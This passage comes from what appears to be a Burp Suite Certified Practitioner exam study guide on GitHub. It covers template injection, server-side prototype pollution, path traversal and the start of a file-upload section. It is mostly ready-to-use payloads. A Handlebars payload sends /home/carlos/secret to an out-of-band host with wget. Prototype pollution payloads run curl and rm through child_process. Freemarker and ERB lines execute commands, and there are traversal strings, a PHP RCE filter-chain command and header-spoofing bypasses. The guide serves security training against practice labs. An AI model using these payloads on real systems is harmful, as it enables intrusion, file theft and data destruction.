{{settings.SECRET_KEY}}"><pre class="notranslate"><code>${{&lt;%[%'"}}%\,
{% debug %} 
{{settings.SECRET_KEY}}
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/django-template.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/django-template.png" alt="Django template" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects" rel="nofollow">PortSwigger Lab: Server-side template injection with information disclosure via user-supplied objects</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Freemarker</h3><a id="user-content-freemarker" class="anchor" aria-label="Permalink: Freemarker" href="#freemarker"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Freemarker Template Content-Manager (C0nt3ntM4n4g3r)</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="${foobar}
&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;cat /home/carlos/secret&quot;) }"><pre class="notranslate"><code>${foobar}
&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ ex("cat /home/carlos/secret") }
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/freemarker-template.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/freemarker-template.png" alt="Freemarker template" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation" rel="nofollow">PortSwigger Lab: Server-side template injection using documentation</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">ERB</h3><a id="user-content-erb" class="anchor" aria-label="Permalink: ERB" href="#erb"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Embedded Ruby (ERB) template syntax<br>
Identify ERB template in a <code>GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2</code> request that then reflects the message value in the response, <code>Unfortunately this product is out of stock</code>.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="fuzzer${{&lt;%[%'&quot;}}%\&lt;&gt;
&lt;%= 7*7 %&gt;"><pre class="notranslate"><code>fuzzer${{&lt;%[%'"}}%\&lt;&gt;
&lt;%= 7*7 %&gt;
</code></pre></div>
<blockquote>
<p dir="auto">ERB Template documentation reveals that you can list all directories and then read arbitrary files as follows:</p>
</blockquote>
<div class="highlight highlight-text-html-erb notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;%= Dir.entries('/') %&gt;
&lt;%= File.open('/example/arbitrary-file').read %&gt;

&lt;%= system(&quot;cat /home/carlos/secret&quot;) %&gt;"><pre><span class="pl-k">&lt;%=</span> Dir.entries('/') <span class="pl-k">%&gt;</span>
<span class="pl-k">&lt;%=</span> File.open('/example/arbitrary-file').read <span class="pl-k">%&gt;</span>

<span class="pl-k">&lt;%=</span> system("cat /home/carlos/secret") <span class="pl-k">%&gt;</span><span class="pl-v"></span><span class="pl-kos"></span><span class="pl-en"></span><span class="pl-kos"></span><span class="pl-s"></span><span class="pl-kos"></span><span class="pl-v"></span><span class="pl-kos"></span><span class="pl-en"></span><span class="pl-kos"></span><span class="pl-s"></span><span class="pl-kos"></span><span class="pl-kos"></span><span class="pl-en"></span><span class="pl-en"></span><span class="pl-kos"></span><span class="pl-s"></span><span class="pl-kos"></span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/erb-template.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/erb-template.png" alt="ERB template" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic" rel="nofollow">PortSwigger Lab: Basic server-side template injection</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Handlebars</h3><a id="user-content-handlebars" class="anchor" aria-label="Permalink: Handlebars" href="#handlebars"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Handlebars Template can be identified by injecting below set of characters and not encoding them into the <code>GET /?message=Unfortunately this product is out of stock</code> parameter. <a href="https://github.com/vladko312/SSTImap">SSTIMAP</a> was not able to identify this handlebars SSTI vulnerability.</p>
</blockquote>
<p dir="auto">Use fuzzer payload to produce error message that <em><strong>identify</strong></em> handlebars template engine.</p>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="fuzzer${{&lt;%[%'&quot;}}%\,&lt;&gt;"><pre class="notranslate"><code>fuzzer${{&lt;%[%'"}}%\,&lt;&gt;
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identified-ssti-handlebars.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identified-ssti-handlebars.png" alt="identified-ssti-handlebars.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto"><a href="https://www.urlencoder.org/" rel="nofollow">URL encoding</a> the payload, it is not required to remove newline breaks or spaces. The payload will send the contents of <code>/home/carlos/secret</code> to Burp Collaborator.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="wrtz{{#with &quot;s&quot; as |string|}}
    {{#with &quot;e&quot;}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub &quot;constructor&quot;)}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push &quot;return require('child_process').exec('wget https://OASTIFY.COM --post-file=/home/carlos/secret');&quot;}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}"><pre class="notranslate"><code>wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('wget https://OASTIFY.COM --post-file=/home/carlos/secret');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/handlebars-template.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/handlebars-template.png" alt="Handlebars template" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit" rel="nofollow">PortSwigger Lab: Server-side template injection in an unknown language</a></p>
<p dir="auto"><a href="https://portswigger.net/research/server-side-template-injection" rel="nofollow">PortSwigger Research SSTI</a></p>
<blockquote>
<p dir="auto">Note: <em><strong>Identify</strong></em> the Update forgot email template message under the admin_panel at the path /update_forgot_email.</p>
</blockquote>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">SSPP - Server Side Prototype Pollution</h2><a id="user-content-sspp---server-side-prototype-pollution" class="anchor" aria-label="Permalink: SSPP - Server Side Prototype Pollution" href="#sspp---server-side-prototype-pollution"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">The application run <code>Node.js</code> and the Express framework. It is vulnerable to server-side prototype pollution (SSPP) because it unsafely merges user-controllable input into a server-side JavaScript object.</p>
</blockquote>
<blockquote>
<p dir="auto">SSPP Exploit steps:</p>
</blockquote>
<ol dir="auto">
<li>Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.</li>
<li>Identify a gadget that you can use to inject and execute arbitrary system commands.</li>
<li>Trigger remote execution of a command that deletes the file /home/carlos/morale.txt.</li>
</ol>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> prototype pollution</p>
</blockquote>
<div class="highlight highlight-source-json notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&quot;__proto__&quot;: {
    &quot;json spaces&quot;:10
}"><pre><span class="pl-ent">"__proto__"</span>: {
    <span class="pl-ent">"json spaces"</span>:<span class="pl-c1">10</span>
}</pre></div>
<blockquote>
<p dir="auto">Test for remote code execution (RCE) by performing DNS request from back-end.</p>
</blockquote>
<div class="highlight highlight-source-json notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&quot;__proto__&quot;: {
    &quot;execArgv&quot;:[
        &quot;--eval=require('child_process').execSync('curl https://OASTIFY.COM')&quot;
    ]
}"><pre><span class="pl-ent">"__proto__"</span>: {
    <span class="pl-ent">"execArgv"</span>:[
        <span class="pl-s"><span class="pl-pds">"</span>--eval=require('child_process').execSync('curl https://OASTIFY.COM')<span class="pl-pds">"</span></span>
    ]
}</pre></div>
<p dir="auto">Inject exploit in to read or delete user sensitive data. After injection, trigger new spawned node child processes, by using admin panel maintenance jobs button. This will action on Carlos <code>secret</code> file.</p>
<div class="highlight highlight-source-json notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&quot;__proto__&quot;: {
    &quot;execArgv&quot;:[
        &quot;--eval=require('child_process').execSync('rm /home/carlos/morale.txt')&quot;
    ]
}"><pre><span class="pl-ent">"__proto__"</span>: {
    <span class="pl-ent">"execArgv"</span>:[
        <span class="pl-s"><span class="pl-pds">"</span>--eval=require('child_process').execSync('rm /home/carlos/morale.txt')<span class="pl-pds">"</span></span>
    ]
}</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/sspp.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/sspp.png" alt="SSPP JSON injection" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution" rel="nofollow">PortSwigger Lab: Remote code execution via server-side prototype pollution</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">File Path Traversal</h2><a id="user-content-file-path-traversal" class="anchor" aria-label="Permalink: File Path Traversal" href="#file-path-traversal"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="https://github.com/botesjuan/cpts-quick-references/blob/main/module/File%20Inclusions.md">HackTheBox CPTS File Inclusion</a><br>
<a href="#lfi-attacks">LFI Attacks</a><br>
<a href="#admin-portal-files">Admin Portal Files</a><br>
<a href="#path-traversal-authz">Path Traversal Authz</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">LFI attacks</h3><a id="user-content-lfi-attacks" class="anchor" aria-label="Permalink: LFI attacks" href="#lfi-attacks"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><a href="https://youtu.be/XhieEh9BlGc" rel="nofollow">Rana Khalil Directory traversal training</a> demo show the attacks that allow the malicious actor to read file on the server.<br>
<em><strong>Identify</strong></em> web parameters such as <code>filename=</code> that are requesting files from target.</p>
</blockquote>
<ol dir="auto">
<li>Application blocks traversal sequences but treats the supplied filename as being relative to a absolute path and can be exploit with <code>/etc/passwd</code>absolute path to target file payload.</li>
<li>Images on target is loaded using <code>filename</code> parameter, and is defending against traversal attacks by stripping path traversal. Exploit using <code>....//....//....//....//etc/passwd</code> payloads.</li>
<li>Superfluous URL-encoded <code>..%252f..%252f..%252fetc/passwd</code> payload can bypass application security controls.</li>
<li>Leading the beginning of the filename referenced with the original path and then appending <code>/var/www/images/../../../etc/passwd</code> payload at end bypasses the protection.</li>
<li>Using a <strong>null</strong> byte character at end plus an image extension to fool APP controls that an image is requested, this <code>../../../etc/passwd%00.png</code> payload succeed.</li>
<li>Double URL encode file path traversal, as example this <code>../../../../../../../../../../etc/hostname</code> will be URL double encoded as, <code>%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhostname</code>.</li>
<li>Windows OS accept both <code>../</code> and <code>..\</code> for directory traversal syntax, and as example retrieving <code>loadImage?filename=..\..\..\windows\win.ini</code> on windows target to <em><strong>identify</strong></em> valid path traversal.</li>
<li><a href="https://github.com/botesjuan/cpts-quick-references/blob/main/module/File%20Inclusions.md#remote-code-execution">PHP Wrapper, expect &amp; filter</a> pose vulnerability that allow traversal bypass to result in remote code execution (RCE) critical. Using <a href="https://github.com/synacktiv/php_filter_chain_generator">PHP filter chain generator</a> to get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP! See <a href="https://youtu.be/OGjpTT6xiFI?t=1019" rel="nofollow">Tib3rius YouTube demo</a> <code>python php_filter_chain.generator.py --chain '&lt;?=`$_GET[0]`; ?&gt;' | tail -n 1 | urlencode</code></li>
<li><code>..%2f</code> is also basic dot dot Forward Slash file path traversal obfuscation technique payload <code>..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd</code></li>
</ol>
<blockquote>
<p dir="auto">Corresponding PortSwigger Directory traversal labs.</p>
</blockquote>
<ol dir="auto">
<li><a href="https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass" rel="nofollow">PortSwigger Lab: File path traversal, traversal sequences blocked with absolute path bypass</a></li>
<li><a href="https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively" rel="nofollow">PortSwigger Lab: File path traversal, traversal sequences stripped non-recursively</a></li>
<li><a href="https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode" rel="nofollow">PortSwigger Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</a></li>
<li><a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path" rel="nofollow">PortSwigger Lab: File path traversal, validation of start of path</a></li>
<li><a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass" rel="nofollow">PortSwigger Lab: File path traversal, validation of file extension with null byte bypass</a></li>
</ol>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/file-path-traversal-null-byte.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/file-path-traversal-null-byte.png" alt="file-path-traversal-null-byte.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">BSCP Exam challenge <em><strong>identified</strong></em>, after obtaining admin session access, you can read <code>/etc/passwd</code> and <code>/etc/hostname</code> but as soon using same bypass file path traversal technique, the <code>home/carlos/secret</code> give response <code>403 Forbidden</code>.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Admin Portal Files</h3><a id="user-content-admin-portal-files" class="anchor" aria-label="Permalink: Admin Portal Files" href="#admin-portal-files"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">On the admin portal <em><strong>identify</strong></em> that the images are loaded using <strong>imagefile=</strong> parameter. Test if vulnerable to directory traversal. The imagefile parameter is vulnerable to directory traversal path attacks, enabling read access to arbitrary files on the server.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"><pre>GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd</pre></div>
<blockquote>
<p dir="auto">Note: Add the fuzzing path traversal payload from drop-down list option, <em><strong>Add from list ...</strong></em>. Then set processing rule on the provided payload to replace the FILE place holder with reg-ex <code>\{FILE\}</code> for each of the attacks.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/payloads-for-path-traverse.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/payloads-for-path-traverse.png" alt="payloads for path traverse" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Burp Intruder provides a predefined payload list, as example <strong>"Fuzzing - path traversal"</strong>.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/file-path-traversal" rel="nofollow">PortSwigger Academy File-path-traversal</a></p>
<p dir="auto"><a href="https://www.geeksforgeeks.org/403bypasser-bypass-403-restricted-directory/" rel="nofollow">403bypasser</a></p>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="python3 403bypasser.py -u https://TARGET.net -d /secret"><pre class="notranslate"><code>python3 403bypasser.py -u https://TARGET.net -d /secret
</code></pre></div>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Path Traversal Authz</h3><a id="user-content-path-traversal-authz" class="anchor" aria-label="Permalink: Path Traversal Authz" href="#path-traversal-authz"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Adding Headers in request with value <code>127.0.0.1</code> or <code>localhost</code> can also help in bypassing restrictions.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: localhost
X-Forward-For: localhost
X-Remote-IP: localhost
X-Client-IP: localhost
X-Real-IP: localhost

X-Originating-IP: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1"><pre>X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: localhost
X-Forward-For: localhost
X-Remote-IP: localhost
X-Client-IP: localhost
X-Real-IP: localhost

X-Originating-IP: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1</pre></div>
<p dir="auto"><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses" rel="nofollow">HackTricks Bypass 403 Forbidden paths</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">File Uploads</h2><a id="user-content-file-uploads" class="anchor" aria-label="Permalink: File Uploads" href="#file-uploads"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#bypass-upload-controls">Bypass Upload Controls</a><br>
<a href="#xxe-via-svg-image-upload">XXE via SVG Image upload</a><br>
<a href="#remote-file-inclusion">Remote File Inclusion</a><br>
<a href="#xss-svg-upload">XSS SVG Upload</a><br>
<a href="#race-condition-web-shell-upload">Race Condition Web shell upload</a><br>
<a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/" rel="nofollow">Exploit-Notes: File Upload Attack references</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Bypass Upload Controls</h3><a id="user-content-bypass-upload-controls" class="anchor" aria-label="Permalink: Bypass Upload Controls" href="#bypass-upload-controls"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">A vulnerable image upload function or avatar logo upload, can by exploited and security controls bypassed to upload content to extract sensitive data or execute code server side.</p>
</blockquote>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> any type of file upload function.</p>
</blockquote>
